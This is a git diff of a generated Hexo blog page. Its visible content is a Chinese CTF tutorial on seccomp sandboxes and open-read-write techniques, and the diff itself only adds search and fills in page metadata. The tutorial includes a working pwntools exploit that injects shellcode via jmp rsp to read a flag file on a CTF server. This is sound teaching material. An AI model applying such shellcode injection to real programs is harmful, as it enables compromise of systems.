@@ -17,7 +17,7 @@
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
 
-<script class="next-config" data-name="main" type="application/json">{"hostname":"kubansec.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.22.0","exturl":true,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+<script class="next-config" data-name="main" type="application/json">{"hostname":"kubansec.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.22.0","exturl":true,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false,"trigger":"auto"}}</script><script src="/js/config.js"></script>
 
     <meta name="description" content="前置知识：沙箱保护和ORW沙箱保护 SandBox正常情况下，程序可以使用所有的syscall，但其实这是不安全的，我们可以劫持程序流后通过execve的syscall来getshell。如果不想让程序去执行execve，我们可以这样做：将程序放入一个沙箱中，在这个沙箱中添加一条规则——禁用execve函数。在这个沙箱中的程序只要调用了execve的系统调用，直接给他中断掉，这就是沙箱sandbo">
 <meta property="og:type" content="article">
@@ -105,6 +105,7 @@
 
   <div class="site-nav-right">
     <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
     </div>
   </div>
 </div>
@@ -113,11 +114,37 @@
 
 <nav class="site-nav">
   <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">21</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">2</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">8</span></a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
   </ul>
 </nav>
 
 
 
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
 
 </header>
         
@@ -251,14 +278,14 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span></span>
+      <span>7.6k</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>NaN:aN</span>
+      <span>7 分钟</span>
     </span>
 </div>
 
@@ -269,7 +296,7 @@
     
     
     <div class="post-body" itemprop="articleBody"><h1 id="前置知识：沙箱保护和ORW"><a href="#前置知识：沙箱保护和ORW" class="headerlink" title="前置知识：沙箱保护和ORW"></a>前置知识：沙箱保护和ORW</h1><h2 id="沙箱保护-SandBox"><a href="#沙箱保护-SandBox" class="headerlink" title="沙箱保护 SandBox"></a>沙箱保护 SandBox</h2><p>正常情况下，程序可以使用所有的syscall，但其实这是不安全的，我们可以劫持程序流后通过execve的syscall来getshell。<br>如果不想让程序去执行execve，我们可以这样做：将程序放入一个沙箱中，在这个沙箱中添加一条规则——禁用execve函数。在这个沙箱中的程序只要调用了execve的系统调用，直接给他中断掉，这就是沙箱sandbox的作用。</p>
-<p>SandBox的实现一般有两种，一种是<a target="_blank" rel="noopener" href="https://www.cnblogs.com/L0g4n-blog/p/12839171.html">seccomp()函数调用</a>，另一种是<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44846324/article/details/121731640">prctl()函数调用</a></p>
+<p>SandBox的实现一般有两种，一种是<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTDBnNG4tYmxvZy9wLzEyODM5MTcxLmh0bWw=">seccomp()函数调用<i class="fa fa-external-link-alt"></i></span>，另一种是<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0ODQ2MzI0L2FydGljbGUvZGV0YWlscy8xMjE3MzE2NDA=">prctl()函数调用<i class="fa fa-external-link-alt"></i></span></p>
 <span id="more"></span>
 
 <h2 id="沙箱检测"><a href="#沙箱检测" class="headerlink" title="沙箱检测"></a>沙箱检测</h2><p>首先安装seccomp-tools</p>
@@ -291,7 +318,7 @@
 </blockquote>
 <p>栈上的orw根据利用方式分为orw_shellcode型和orw_ROP型，通过两个例题入手</p>
 <h1 id="例1：ORW-shellcode-极客大挑战-2019-Not-Bad"><a href="#例1：ORW-shellcode-极客大挑战-2019-Not-Bad" class="headerlink" title="例1：ORW_shellcode [极客大挑战 2019]Not Bad"></a>例1：ORW_shellcode [极客大挑战 2019]Not Bad</h1><blockquote>
-<p>题目链接：<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges">https://buuoj.cn/challenges</a></p>
+<p>题目链接：<span class="exturl" data-url="aHR0cHM6Ly9idXVvai5jbi9jaGFsbGVuZ2Vz">https://buuoj.cn/challenges<i class="fa fa-external-link-alt"></i></span></p>
 </blockquote>
 <h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>checksec;file，64位，保护全关——没有开NX保护，可以在栈上写shellcode<br><img src="/images/p2/image-2.png"><br>IDA里面看到有三个函数，并在0x123000处开辟了0x1000的<strong>可写可执行</strong>的空间<br><img src="/images/p2/image-3.png"></p>
 <p>第一个函数开启了seccomp函数，将他重命名为seccomp_init</p>
@@ -309,7 +336,7 @@
 <h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.arch = &#x27;amd64&#x27;</span><br><span class="line">io = remote(&#x27;node5.buuoj.cn&#x27;,28895)</span><br><span class="line">elf = ELF(&#x27;./bad&#x27;)</span><br><span class="line">jmp_rsp = 0x400A01</span><br><span class="line">mmap = 0x123000</span><br><span class="line">orw = shellcraft.open(&#x27;./flag&#x27;)</span><br><span class="line">orw += shellcraft.read(3,mmap,0x100)</span><br><span class="line">orw += shellcraft.write(1,mmap,0x100)</span><br><span class="line">orw = asm(orw)</span><br><span class="line">payload = asm(shellcraft.read(0,mmap,0x100)) +asm(&#x27;mov r15,0x123000;call r15&#x27;)</span><br><span class="line">payload = payload.ljust(0x28,b&#x27;\x90&#x27;)</span><br><span class="line">payload += p64(jmp_rsp) + asm(&#x27;sub rsp,0x30;jmp rsp&#x27;)</span><br><span class="line">io.recvline()</span><br><span class="line">io.send(payload)</span><br><span class="line">io.send(orw)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
 <h1 id="例2：ORW-ROP-HGAME-2023-week1-orw"><a href="#例2：ORW-ROP-HGAME-2023-week1-orw" class="headerlink" title="例2：ORW_ROP [HGAME 2023 week1] orw"></a>例2：ORW_ROP [HGAME 2023 week1] orw</h1><blockquote>
-<p>题目链接：<a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/3489">https://www.nssctf.cn/problem/3489</a></p>
+<p>题目链接：<span class="exturl" data-url="aHR0cHM6Ly93d3cubnNzY3RmLmNuL3Byb2JsZW0vMzQ4OQ==">https://www.nssctf.cn/problem/3489<i class="fa fa-external-link-alt"></i></span></p>
 </blockquote>
 <h2 id="程序分析-1"><a href="#程序分析-1" class="headerlink" title="程序分析"></a>程序分析</h2><p>先把ld和libc链接到程序</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kuban@kuban-virtual-machine:~/Desktop/pwn/test/orw$ patchelf --set-interpreter /home/kuban/Desktop/pwn/test/orw/ld-2.31.so vuln </span><br><span class="line">kuban@kuban-virtual-machine:~/Desktop/pwn/test/orw$ patchelf --replace-needed libc.so.6 /home/kuban/Desktop/pwn/test/orw/libc-2.31.so vuln</span><br><span class="line">kuban@kuban-virtual-machine:~/Desktop/pwn/test/orw$ ldd vuln </span><br><span class="line">        linux-vdso.so.1 (0x00007fff70b25000)</span><br><span class="line">        /home/kuban/Desktop/pwn/test/orw/libc-2.31.so (0x000076c7d729c000)</span><br><span class="line">        /home/kuban/Desktop/pwn/test/orw/ld-2.31.so =&gt; /lib64/ld-linux-x86-64.so.2 (0x000076c7d7490000)</span><br></pre></td></tr></table></figure>
@@ -419,13 +446,13 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-line"></i>
     </span>
-    <span title="站点总字数">NaNm</span>
+    <span title="站点总字数">39k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">NaN:aN</span>
+    <span title="站点阅读时长">36 分钟</span>
   </span>
 </div>
 <div class="busuanzi-count">
@@ -474,7 +501,9 @@
   <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
 <script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
 
-  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
 
 
 
